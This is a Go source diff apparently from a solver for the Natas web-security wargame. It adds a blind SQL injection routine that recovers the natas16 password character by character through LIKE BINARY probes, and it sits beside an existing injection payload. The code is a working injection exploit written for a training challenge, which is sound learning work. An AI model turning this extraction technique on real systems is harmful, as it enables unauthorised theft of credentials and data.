@@ -267,6 +267,40 @@ func (c Combine) Grab(r http.Request) string {
 	return prefix + suffix
 }
 
+type SQLBruteForce struct {
+	Field, SQLPrefix, Success string
+}
+
+func (s SQLBruteForce) Grab(r http.Request) string {
+	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
+	var (
+		p = Post{
+			grab,
+			SetData{s.Field: nil},
+			nil,
+		}
+		result, knownChars string
+	)
+
+	for _, c := range chars {
+		p.Data[s.Field] = Text{s.SQLPrefix + "%" + string(c) + "%"}
+		if strings.Contains(p.Grab(r), s.Success) {
+			knownChars += string(c)
+		}
+	}
+Loop:
+	for {
+		for _, c := range knownChars {
+			p.Data[s.Field] = Text{s.SQLPrefix + result + string(c) + "%"}
+			if strings.Contains(p.Grab(r), s.Success) {
+				result += string(c)
+				continue Loop
+			}
+		}
+		return result
+	}
+}
+
 var levels = [...]Grabber{
 	//level 0
 	Prefixed{grab, "The password for natas1 is ", 32},
@@ -381,6 +415,11 @@ var levels = [...]Grabber{
 			"username": Text{"\" OR password != \"\" #"},
 		},
 		nil,
+	},
+	SQLBruteForce{
+		"username",
+		"natas16\" AND password LIKE BINARY \"",
+		"This user exists.",
 	},
 }
 
